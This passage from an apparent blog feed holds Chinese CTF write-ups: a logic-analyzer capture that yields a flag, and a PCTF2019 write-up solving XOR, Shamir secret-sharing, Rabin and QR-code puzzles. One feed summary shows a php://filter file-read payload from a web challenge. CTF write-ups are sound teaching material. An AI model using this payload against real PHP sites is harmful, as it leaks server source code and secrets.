class="number">161</span>',e,Read,ACK</span><br><span class="line"><span class="number">0.948117500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">1</span>,Read,ACK</span><br><span class="line"><span class="number">0.948281000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">0</span>,Read,ACK</span><br><span class="line"><span class="number">0.948444500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.948608000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',e,Read,ACK</span><br><span class="line"><span class="number">0.948771500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">9</span>,Read,ACK</span><br><span class="line"><span class="number">0.948935500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',b,Read,ACK</span><br><span class="line"><span class="number">0.949099000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">5</span>,Read,ACK</span><br><span class="line"><span class="number">0.949262500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.949426000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">4</span>,Read,ACK</span><br><span class="line"><span class="number">0.949589500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',d,Read,ACK</span><br><span class="line"><span class="number">0.949753000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">9</span>,Read,ACK</span><br><span class="line"><span class="number">0.949917000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">0</span>,Read,ACK</span><br><span class="line"><span class="number">0.950080500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.950244000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',a,Read,ACK</span><br><span class="line"><span class="number">0.950407500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">8</span>,Read,ACK</span><br><span class="line"><span class="number">0.950571000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">8</span>,Read,ACK</span><br><span class="line"><span class="number">0.950734500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">3</span>,Read,ACK</span><br><span class="line"><span class="number">0.950898000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',-,Read,ACK</span><br><span class="line"><span class="number">0.951061500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">4</span>,Read,ACK</span><br><span class="line"><span class="number">0.951225000000000</span>,<span class="number">2</span>,'<span class="number">161</span>',<span class="number">1</span>,Read,ACK</span><br><span class="line"><span class="number">0.951388500000000</span>,<span class="number">2</span>,'<span class="number">161</span>',c,Read,NAK</span><br><span class="line"><span class="number">5.946647000000000</span>,<span class="number">3</span>,'<span class="number">160</span>',\t,Write,ACK</span><br><span class="line"><span class="number">5.946813500000000</span>,<span class="number">3</span>,'<span class="number">160</span>',a,Write,ACK</span><br><span class="line"><span class="number">5.946980000000000</span>,<span class="number">3</span>,'<span class="number">160</span>',c,Write,ACK</span><br></pre></td></tr></table></figure></li></ol><h2 id="usbasp"><a href="#usbasp" class="headerlink" title="usbasp"></a>usbasp</h2><ol><li>analyzer 选SPI<br><img src="https://uploader.shimo.im/f/Rsc7z3OMEnE120JA.png!thumbnail" alt=""></li><li>导出<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Time [s],Packet ID,MOSI,MISO</span><br><span class="line"><span class="number">1.474939400000000</span>,,f,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474945500000000</span>,,l,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474951600000000</span>,,a,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474957700000000</span>,,g,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474963800000000</span>,,&#123;,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474969900000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474976000000000</span>,,<span class="number">5</span>,<span class="number">5</span></span><br><span class="line"><span class="number">1.474982100000000</span>,,b,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474988300000000</span>,,<span class="number">0</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.474994400000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475000500000000</span>,,<span class="number">4</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475006600000000</span>,,c,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475012700000000</span>,,<span class="number">6</span>,<span class="number">6</span></span><br><span class="line"><span class="number">1.475018800000000</span>,,-,-</span><br><span class="line"><span class="number">1.475024900000000</span>,,<span class="number">4</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475031100000000</span>,,<span class="number">2</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475037200000000</span>,,e,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475043300000000</span>,,<span class="number">6</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475049400000000</span>,,-,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475055500000000</span>,,<span class="number">4</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475061600000000</span>,,<span class="number">9</span>,<span class="number">9</span></span><br><span class="line"><span class="number">1.475067700000000</span>,,<span class="number">5</span>,'<span class="number">5</span>'</span><br><span class="line"><span class="number">1.475073900000000</span>,,c,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475080000000000</span>,,-,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475086100000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475092200000000</span>,,<span class="number">7</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475098300000000</span>,,b,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475104400000000</span>,,<span class="number">4</span>,<span class="number">0</span></span><br><span class="line"><span class="number">1.475110500000000</span>,,-,-</span><br><span class="line"><span class="number">1.475116600000000</span>,,<span class="number">4</span>,'<span class="number">4</span>'</span><br><span class="line"><span class="number">1.475122800000000</span>,,<span class="number">6</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475128900000000</span>,,d,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475135000000000</span>,,f,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475141100000000</span>,,b,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475147200000000</span>,,<span class="number">1</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475153300000000</span>,,d,d</span><br><span class="line"><span class="number">1.475159400000000</span>,,f,f</span><br><span class="line"><span class="number">1.475165500000000</span>,,<span class="number">5</span>,'<span class="number">1</span>'</span><br><span class="line"><span class="number">1.475171700000000</span>,,<span class="number">8</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475177800000000</span>,,a,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475183900000000</span>,,<span class="number">0</span>,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475190000000000</span>,,&#125;,'<span class="number">0</span>'</span><br><span class="line"><span class="number">1.475196100000000</span>,,'<span class="number">0</span>','<span class="number">0</span>'</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;JustSoso&quot;&gt;&lt;a href=&quot;#JustSoso&quot; class=&quot;headerlink&quot; title=&quot;JustSoso&quot;&gt;&lt;/a&gt;JustSoso&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;?file=php://filter/read=convert.base64-encode/resource=hint.php&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PCTF2019-Writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/03/16/PCTF2019-Writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/03/16/PCTF2019-Writeup/</id>
    <published>2019-03-16T04:45:35.000Z</published>
    <updated>2019-03-16T04:46:38.982Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Spoiler"><a href="#Spoiler" class="headerlink" title="Spoiler"></a>Spoiler</h2><blockquote><p>Bran Stark, wants to convey an important information to the Sansa back at winterfell. He sends her a message. The message however, is encrypted though.Can you find out what Bran is trying to convey??</p></blockquote><a id="more"></a><ol><li>题目给了一个key.pdf打开内容为<blockquote><p>3a2c3a35152538272c2d213e332e3c25383030373a15</p></blockquote></li><li>明明简单的一道题到头来做不出，后面发现脑洞还是不够强</li><li>winhex打开pdf看到文件尾后面有东西<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190313174436.png?raw=true" alt=""></li><li>提取出来刚好发现与米密文长度相同<blockquote><p>6a6f6e736e6f776973647261676f6e62796269727468</p></blockquote></li><li>xor一下<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="string">'3a2c3a35152538272c2d213e332e3c25383030373a15'</span></span><br><span class="line"><span class="attribute">b</span>=<span class="string">'6a6f6e736e6f776973647261676f6e62796269727468'</span></span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)/2):</span><br><span class="line">    flag+=chr(int(a[i<span class="number">*2</span>:i<span class="number">*2</span>+2],16)^int(b[i<span class="number">*2</span>:i<span class="number">*2</span>+2],16))</span><br><span class="line"><span class="builtin-name">print</span> flag</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>PCTF{JON_IS_TARGARYEN}</p></blockquote><h2 id="The-Order-of-the-Phoenix"><a href="#The-Order-of-the-Phoenix" class="headerlink" title="The Order of the Phoenix"></a>The Order of the Phoenix</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">It's a new age Order of the Phoenix. The current members are:</span><br><span class="line"></span><br><span class="line">1.Harry</span><br><span class="line">2.Hermione</span><br><span class="line">3.Ron</span><br><span class="line">4.George</span><br><span class="line">5.Charlie</span><br><span class="line">6.Bill</span><br><span class="line">7.Ginny</span><br><span class="line">8.Fleur</span><br><span class="line">9.Luna</span><br><span class="line">10.Neville</span><br><span class="line">Each of them has a secret QR code associated <span class="keyword">with</span> him/her which <span class="keyword">is</span> given <span class="keyword">to</span> you. <span class="keyword">At</span> the entrance <span class="keyword">of</span> the Grimmauld place, <span class="keyword">is</span> a <span class="keyword">system</span> <span class="keyword">to</span> <span class="keyword">scan</span> their QR codes.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Any</span> <span class="number">5</span> <span class="keyword">or</span> more <span class="keyword">of</span> them can enter <span class="keyword">at</span> once, but <span class="keyword">not</span> <span class="keyword">less</span> <span class="keyword">than</span> <span class="number">5.</span> This <span class="keyword">is</span> <span class="keyword">in</span> place <span class="keyword">to</span> prevent <span class="keyword">any</span> rash decisions made <span class="keyword">by</span> very few people regarding the matters concerning the Order.</span><br><span class="line"></span><br><span class="line">However, <span class="keyword">now</span> <span class="keyword">is</span> an emergency time. Malfoy <span class="keyword">is</span> causing trouble again, <span class="keyword">and</span> Harry needs <span class="keyword">to</span> enter Grimmauld Place <span class="keyword">for</span> which he needs <span class="keyword">to</span> know the secret associated <span class="keyword">with</span> the entry <span class="keyword">system</span> <span class="keyword">to</span> let him in. <span class="keyword">Help</span> him out.</span><br></pre></td></tr></table></figure><ol><li><p>题目给了10个人的二维码扫出来如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Bill: a<span class="number">-424</span>b<span class="number">493442128</span>adbeef<span class="number">5</span>ce<span class="number">33</span>f<span class="number">18</span><span class="keyword">c</span><span class="number">6</span><span class="keyword">c</span><span class="number">5996</span>cdd<span class="number">97e4922644</span>a<span class="number">4479</span>bb<span class="number">4e05</span>f<span class="number">8846</span>f</span><br><span class="line">Charlie: <span class="number">8</span><span class="number">-1268</span>bf<span class="number">4430</span><span class="keyword">c</span><span class="number">0</span>b<span class="number">1</span>a<span class="number">4</span><span class="keyword">c</span><span class="number">568</span>a<span class="number">302</span>da<span class="number">92421</span>bc<span class="number">672</span>aceb<span class="number">57</span>fef<span class="number">3401</span>f<span class="number">2434</span>cfc<span class="number">3</span>bf<span class="number">740</span>b</span><br><span class="line">Fleur: <span class="number">9</span>-b<span class="number">52781</span>fd<span class="number">38</span>b<span class="number">0185</span>bd<span class="number">1</span>a<span class="number">8</span>a<span class="number">92</span>a<span class="number">92</span>dbf<span class="number">01</span><span class="keyword">c</span><span class="number">99</span>eddbb<span class="number">50</span>b<span class="number">86</span>f<span class="number">65</span>a<span class="number">882</span>ad<span class="number">8</span>a<span class="number">7</span>fa<span class="number">313e9</span>d</span><br><span class="line">George: <span class="number">6</span><span class="number">-7</span><span class="keyword">c</span><span class="number">61</span>f<span class="number">3</span>ee<span class="number">00</span>ab<span class="number">759</span>a<span class="number">6853</span>f<span class="number">041e74</span>ae<span class="number">2378144</span>a<span class="number">96</span>b<span class="number">662230888</span>d<span class="number">6</span>ba<span class="number">6412</span><span class="keyword">c</span><span class="number">646190</span></span><br><span class="line">Ginny: <span class="number">7</span>-d<span class="number">01</span>f<span class="number">29e42</span>de<span class="number">0</span>ab<span class="number">1</span>fb<span class="number">183</span>a<span class="number">35</span>d<span class="number">06</span>a<span class="number">2</span>ac<span class="number">6117</span>acaad<span class="number">2</span>b<span class="number">3017671846</span><span class="keyword">c</span><span class="number">7</span>b<span class="number">380e83</span>d<span class="number">6</span>bb</span><br><span class="line">Harry: <span class="number">1</span>-d<span class="number">301</span>da<span class="number">5536</span>a<span class="number">5</span>d<span class="number">8</span>b<span class="number">8e2</span>be<span class="number">50</span>a<span class="number">7584127</span>eb<span class="number">3704025</span>f<span class="number">048</span>cf<span class="number">72335</span>f<span class="number">1</span>b<span class="number">301</span>b<span class="number">852</span>b<span class="number">30</span>a</span><br><span class="line">Hermione: <span class="number">2</span>-e<span class="number">1</span>af<span class="number">01e2</span>f<span class="number">7887</span>b<span class="number">63</span><span class="keyword">c</span><span class="number">068823</span>cbcd<span class="number">812</span>f<span class="number">91899678656456</span>db<span class="number">71</span>dfa<span class="number">9</span>ab<span class="number">1</span>fbb<span class="number">1</span>bd<span class="number">26</span></span><br><span class="line">Luna: <span class="number">4</span><span class="number">-510</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span><span class="number">8</span>f<span class="number">6</span>aaacebf<span class="number">16</span>bb<span class="number">5</span>fd<span class="number">9e2</span>cd<span class="number">8</span><span class="keyword">c</span><span class="number">0845</span>ec<span class="number">483</span>bd<span class="number">49</span>bf<span class="number">57</span>fa<span class="number">4151e5</span>b<span class="number">672</span><span class="keyword">c</span><span class="number">73</span>b<span class="number">0</span></span><br><span class="line">Neville: <span class="number">3</span>-dc<span class="number">60</span>d<span class="number">55</span>a<span class="number">411</span>ccfd<span class="number">4</span>a<span class="number">44e6</span>a<span class="number">9799774</span>dd<span class="number">6207</span>dffdfcab<span class="number">4</span>b<span class="number">442075</span>ead<span class="number">165</span>fa<span class="number">7</span>ecb</span><br><span class="line">Ron: <span class="number">5</span>-bd<span class="number">4</span>f<span class="number">58</span>a<span class="number">846</span>bb<span class="number">9e47</span>a<span class="number">7402e22</span>df<span class="number">13002</span>aef<span class="number">3</span>bf<span class="number">3048011674269</span>eaff<span class="number">39154</span><span class="keyword">c</span><span class="number">62</span>bf</span><br></pre></td></tr></table></figure></li><li><p>然而不知道是干嘛的，完全没方向</p></li><li>看了hint<blockquote><p>Eleven scientists are working on a secret project…….?</p></blockquote></li><li>google一下不懂，但是github上找到方法<br><a href="https://github.com/blockstack/secret-sharing/blob/master/README.md" target="_blank" rel="noopener">传送门</a><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from secretsharing import PlaintextToHexSecretSharer</span><br><span class="line">&gt;&gt;&gt; flags=['1-d301da<span class="number">5536</span>a5d8b8e2be50a<span class="number">758412</span>7eb<span class="number">370402</span>5f048cf<span class="number">7233</span>5f1b301b852b30a','2-e1af01e2f<span class="number">7887</span>b63c<span class="number">068823</span>cbcd812f<span class="number">91899678656456</span>db71dfa9ab1fbb1bd26','3-dc60d55a411ccfd4a44e6a<span class="number">979977</span>4dd<span class="number">6207</span>dffdfcab4b<span class="number">442075</span>ead165fa7ecb','4-510c9c8f6aaacebf16bb5fd9e2cd8c<span class="number">0845</span>ec483bd49bf57fa<span class="number">4151</span>e5b672c73b0','5-bd4f58a846bb9e47a<span class="number">7402</span>e22df<span class="number">1300</span>2aef3bf<span class="number">304801167426</span>9eaff<span class="number">3915</span>4c62bf','6-7c61f3ee00ab759a<span class="number">6853</span>f041e74ae<span class="number">237814</span>4a96b<span class="number">66223088</span>8d6ba<span class="number">6412</span>c<span class="number">646190</span>','7-d01f29e42de0ab1fb183a35d06a2ac<span class="number">6117</span>acaad2b<span class="number">3017671846</span>c7b380e83d6bb','8-<span class="number">1268</span>bf<span class="number">4430</span>c0b1a4c568a302da<span class="number">9242</span>1bc672aceb57fef<span class="number">3401</span>f<span class="number">2434</span>cfc3bf740b','9-b<span class="number">5278</span>1fd38b<span class="number">0185</span>bd1a8a92a92dbf01c99eddbb50b86f65a882ad8a7fa313e9d','a-424b<span class="number">49344212</span>8adbeef5ce33f18c6c<span class="number">5996</span>cdd97e<span class="number">492264</span>4a<span class="number">4479</span>bb4e05f<span class="number">8846</span>f']</span><br><span class="line">&gt;&gt;&gt; PlaintextToHexSecretSharer.recover_secret(flags[<span class="number">0</span>:<span class="number">10</span>])</span><br><span class="line">'pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125;\n'</span><br></pre></td></tr></table></figure></li></ol><h2 id="Help-Rabin"><a href="#Help-Rabin" class="headerlink" title="Help Rabin"></a>Help Rabin</h2><blockquote><p>Rabin has received a text from someone special, but it’s all in ciphertext and he is unable to make head or tail of it. He requested her for a little hint, and she sent him the encryption algorithm. He’s still unable to decode the text. Not wanting to look dumb to her again, he needs your help in figuring out what she’s written for him. So help him out.</p><ol><li>ciphertext.txt<br>4f741fe93dd7e383ff527caa9a2f27d27fd74b53b62123837b74a2b024d0fbbe052f3b330ce5208ba989fc68e2f5235ac4e9dd9e091e7cb80c02745d9b2aad10cab9431590ae63117ce539ebf747b4bc81f2a293aea52f0b1fee746158dc45d0c8d60769a8a8e671fb049b52669a010a1ca6f5de851d715bf1821d8771bbeb47</li><li>publickey.pem解析出来<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">key</span>长度：<span class="number">1023</span></span><br><span class="line">模数：<span class="number">5</span>BE098727AE610DE9C104819F3A1F7CC5B3144810B38D4F4D51BBE11D9CA20F287EED0236BCED1FE443A335A2F33C7A8AC68F09FC5F38BFE374A9207D3073D402C7A65A30B60F75B10E43A296730AA22D32527F7203EC9BECC6A7A0DD70A5CE3D1D5F2A8DB9868E8A4534EEF705F2C6A8326C88A536B827C88BC0005227AC9</span><br><span class="line">指数：<span class="number">1</span> (<span class="number">0x1</span>)</span><br></pre></td></tr></table></figure></li></ol></blockquote><ol start="3"><li><p>encrypt.py</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def nextPrime(prim):</span><br><span class="line">    if isPrime(prim):</span><br><span class="line">        return prim</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return nextPrime(prim+1)</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = nextPrime(p+1)</span><br><span class="line">while p%4 != 3 or q%4 !=3:</span><br><span class="line">    p = getPrime(512)</span><br><span class="line">    q = nextPrime(p+1)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">m = open('secret.txt').read()</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">m = m**e</span><br><span class="line">c = (m*m)%n</span><br><span class="line">c = long_to_bytes(c)</span><br><span class="line">c = c.encode('hex')</span><br><span class="line"></span><br><span class="line">cipherfile = open('ciphertext.txt','w')</span><br><span class="line">cipherfile.write(c)</span><br></pre></td></tr></table></figure></li><li><p>题目得知用的是rabin算法,表面e=1,通过脚本可知实际是2</p></li><li>yafu分解模直接上脚本<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">import gmpy2</span><br><span class="line"><span class="comment"># f = open('flag.enc','r')</span></span><br><span class="line"><span class="comment"># c = f.read()</span></span><br><span class="line"><span class="comment"># c = libnum.s2n(c)</span></span><br><span class="line">c = 55794223709813934192265135096073563545914401645083132264094031861211381439924290498765378643984142482022780941488967640941896234878298378029331869035026299883890239650523385184000895121634725249518610468891121286187697095281449541110528807147056849808508384046722319812216434329882704675650502328191347845959</span><br><span class="line">p = 8268478798627496550868057067863302848395658194493470189583465530982345058367642548587735876643165276333944105562045538477589025350029252013031979923054823</span><br><span class="line">q = 8268478798627496550868057067863302848395658194493470189583465530982345058367642548587735876643165276333944105562045538477589025350029252013031979923054799</span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+1)/4,p)</span><br><span class="line">s = pow(c,(q+1)/4,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x = (a*p*s+b*q*r)%n</span><br><span class="line">y = (a*p*s-b*q*r)%n</span><br><span class="line">print libnum.n2s(x%n)</span><br><span class="line">print libnum.n2s((-x)%n)</span><br><span class="line">print libnum.n2s(y%n)</span><br><span class="line">print libnum.n2s((-y)%n)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190313184457.png?raw=true" alt=""></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="EXORcism"><a href="#EXORcism" class="headerlink" title="EXORcism"></a>EXORcism</h2><blockquote><p>My friend Alex needs your help very fast. He has been possessed by a ghost and the only way to save him is if you tell the flag to the ghost. Hurry up, time is running out!</p></blockquote><ol><li>拿到文件encode.txt是一堆0和1，每行只有一个,去掉换行符后长度为10000,考虑是100*100,结果发现隐约是个二维码</li><li>然而直接扫不出来，把原始的1换作255 255 255，把0换作0 0 0写脚本<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="built_in">from</span> PIL import Image</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">x = <span class="number">100</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">100</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">new</span>(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line"><span class="built_in">file</span> = <span class="built_in">open</span>(<span class="string">'encoded.txt'</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        <span class="built_in">line</span> = <span class="built_in">file</span>.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = <span class="built_in">line</span>.<span class="built_in">split</span>(<span class="string">" "</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.save(<span class="string">"255.png"</span>)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190316122006.png?raw=true" alt=""></p><ol start="3"><li>从二维码得到<blockquote><p>160f15011d1b095339595138535f135613595e1a</p></blockquote></li><li>与flag异或得到<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="string">'160f15011d1b095339595138535f135613595e1a'</span></span><br><span class="line"><span class="attribute">b</span>=<span class="string">'flagflagflagflagflag'</span></span><br><span class="line"><span class="attribute">FLAG</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)/2):</span><br><span class="line">    FLAG+=chr(int(a[i<span class="number">*2</span>:i<span class="number">*2</span>+2],16)^ord(b[i]))</span><br><span class="line"><span class="builtin-name">print</span> FLAG</span><br><span class="line"><span class="comment">#pctf&#123;wh4_50_53r1u5?&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Late-PR"><a href="#Late-PR" class="headerlink" title="Late PR"></a>Late PR</h2><ol><li>直接丢进winhex搜索pctf<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190316124151.png?raw=true" alt=""></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cryptography&quot;&gt;&lt;a href=&quot;#Cryptography&quot; class=&quot;headerlink&quot; title=&quot;Cryptography&quot;&gt;&lt;/a&gt;Cryptography&lt;/h1&gt;&lt;h2 id=&quot;Spoiler&quot;&gt;&lt;a href=&quot;#Spoiler&quot; class=&quot;headerlink&quot; title=&quot;Spoiler&quot;&gt;&lt;/a&gt;Spoiler&lt;/h2&gt;&lt;blockquote&gt;
